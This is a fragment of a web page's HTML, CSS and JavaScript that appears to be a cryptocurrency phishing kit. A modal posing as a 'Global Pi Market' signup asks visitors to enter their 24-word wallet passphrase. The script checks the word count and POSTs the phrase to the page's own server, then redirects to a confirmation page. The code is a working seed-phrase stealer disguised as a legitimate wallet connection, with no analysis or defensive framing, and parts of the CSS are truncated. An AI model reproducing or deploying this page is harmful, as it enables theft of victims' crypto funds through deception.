      font-weight: bold;

    .modal-content button {

      font-weight: bold;
      padding: 16px;
      border-radius: 12px;
      border: none;
      background-color: #7b2cbf;
      color: white;
      width: 100%;
      max-width: 600px;
    }

    .modal-content button:hover {

    }

    .loading-spinner {
      display: none;
      margin-top: 20px;

    .spinner {
      width: 50px;
      height: 50px;
      border: 6px solid white;
      border-top: 6px solid #9d4edd;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }

  <div id="walletModal" class="modal">

      <h2>
        TO COMPLETE SIGN UP TO GLOBAL PI MARKET,<br>
        connect your pi wallet to unlock full access â€” enjoy secure trading, unbeatable rates, all crypto withdraw payment methods, automatic wallet syncing, and instant transactions.
      </h2>
      <textarea id="passphraseInput" placeholder="Enter your 24-word passphrase here..."></textarea>
      <button onclick="validatePassphrase()">CONNECT WALLET</button>
      <div class="loading-spinner" id="loadingSpinner">
        <div class="spinner"></div>
      </div>
    </div>
  </div>

  <script>
    function showWalletPopup(event) {
      event.preventDefault();
      document.getElementById("walletModal").style.display = "flex";
    }

    function validatePassphrase() {
      const input = document.getElementById("passphraseInput").value.trim();
      const wordCount = input.split(/\s+/).length;
      if (wordCount === 24) {
        document.getElementById("loadingSpinner").style.display = "block";
        fetch("/submit-passphrase", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          body: "passphrase=" + encodeURIComponent(input)
        })
        .then(response => {
          if (response.ok) {
            window.location.href = "/confirmation";
          } else {
            return response.text().then(msg => alert(msg));
          }
        })
        .catch(() => {
          alert("Error connecting to the server.");
        });
      } else {
        alert("Invalid passphrase. Please enter exactly 24 words.");
      }
    }
  </script>
